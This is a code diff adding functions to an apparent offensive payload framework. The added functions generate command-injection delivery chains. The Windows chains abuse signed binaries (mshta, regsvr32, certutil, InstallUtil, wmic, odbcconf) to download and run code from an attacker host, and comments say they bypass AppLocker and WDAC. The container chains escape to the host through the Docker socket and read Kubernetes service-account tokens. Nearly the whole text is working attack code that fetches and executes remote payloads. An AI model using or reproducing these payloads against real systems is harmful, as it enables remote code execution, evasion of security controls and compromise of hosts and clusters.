@@ -318,3 +318,48 @@ export function buildWafBypassWrappers(payload: InjectionPayload): Record<string
     env_var:        `$(_NX=${JSON.stringify(raw)};bash -c "$_NX")`,
   };
 }
+
+export function buildWindowsDeliveryChains(lhost: string, lport: string): InjectionPayload[] {
+  const cb = `http://${lhost}:${lport}`;
+  return [
+    makePayload("win_mshta_js","MSHTA JScript RCE (LOLBin)","Windows LOLBin","HTTP","windows",
+      `mshta.exe "javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell -NonI -W Hidden -c \\"IEX(New-Object Net.WebClient).DownloadString(\\'${cb}/p.ps1\\')\\"',0,1);close()" 2>nul`,
+      ["New-Object","IEX"],"MSHTA runs JScript → downloads PS1. Signed MS binary, bypasses AppLocker/WDAC in most orgs."),
+    makePayload("win_regsvr32_scrobj","Regsvr32 COM Scriptlet squiblydoo","Windows LOLBin","HTTP","windows",
+      `regsvr32.exe /s /n /u /i:${cb}/nx.sct scrobj.dll 2>nul`,
+      ["Exec","ScriptletURL"],"Squiblydoo — Regsvr32 fetches SCT scriptlet and executes COM code. Signed MS binary, bypasses AppLocker."),
+    makePayload("win_certutil_b64","CertUtil download+decode","Windows LOLBin","HTTP","windows",
+      `certutil -urlcache -split -f "${cb}/nx.b64" C:\\Windows\\Temp\\nx.b64 && certutil -decode C:\\Windows\\Temp\\nx.b64 C:\\Windows\\Temp\\nx.exe && C:\\Windows\\Temp\\nx.exe 2>nul`,
+      ["Saved","Decoded"],"CertUtil downloads and base64-decodes payload. Signed MS binary, second-stage in many APT chains."),
+    makePayload("win_installutil_bypass","InstallUtil AppHost bypass","Windows LOLBin","HTTP","windows",
+      `powershell -NonI -W Hidden -c "(New-Object Net.WebClient).DownloadFile('${cb}/nx.exe','$env:TEMP\\nx.exe');C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U '$env:TEMP\\nx.exe'" 2>nul`,
+      ["MSI","Install"],"InstallUtil runs .NET assembly Uninstall() — bypasses AppLocker execution control."),
+    makePayload("win_wmic_xsl","WMIC /format XSL transform RCE","Windows LOLBin","HTTP","windows",
+      `wmic.exe process list /format:"${cb}/nx.xsl" 2>nul`,
+      ["xsl","transform"],"WMIC /format downloads remote XSL with embedded JScript. Signed MS binary."),
+    makePayload("win_odbcconf_dll","ODBCCONF REGSVR DLL load","Windows LOLBin","HTTP","windows",
+      `odbcconf.exe /s /a {REGSVR ${cb}/nx.dll} 2>nul`,
+      ["DLL","REGSVR"],"ODBCCONF REGSVR loads arbitrary DLL. Signed, bypasses most application controls."),
+  ];
+}
+
+export function buildContainerDeliveryChains(lhost: string, lport: string): InjectionPayload[] {
+  const cb = `http://${lhost}:${lport}`;
+  return [
+    makePayload("docker_socket_rce","Docker socket → privileged container","Container","Docker","linux",
+      `curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["sh","-c","curl -sk ${cb}/sh|sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true,"NetworkMode":"host"}}' | python3 -c "import sys,json;print(json.load(sys.stdin)['Id'])" | xargs -I{} curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/{}/start"`,
+      ["Id"],"Docker socket → privileged container with host / bind. Immediate host escape."),
+    makePayload("k8s_sa_token_rce","K8s in-cluster SA token → pod exec","Container","K8s","linux",
+      `_T=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _NS=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null||echo default); curl -sk -H "Authorization: Bearer $_T" "https://kubernetes.default.svc/api/v1/namespaces/$_NS/pods" | python3 -c "import sys,json;pods=json.load(sys.stdin).get('items',[]); print(pods[0]['metadata']['name'] if pods else 'NO_PODS')"`,
+      ["metadata","name"],"K8s in-cluster SA token to enumerate pods in namespace."),
+  ];
+}
+
+export function buildAllDeliveryChains(lhost: string, lport: string, cbUrl: string): InjectionPayload[] {
+  return [
+    ...buildLinuxDeliveryChains(lhost, lport, cbUrl),
+    ...buildOobDeliveryChains(lhost, lport, cbUrl),
+    ...buildWindowsDeliveryChains(lhost, lport),
+    ...buildContainerDeliveryChains(lhost, lport),
+  ];
+}
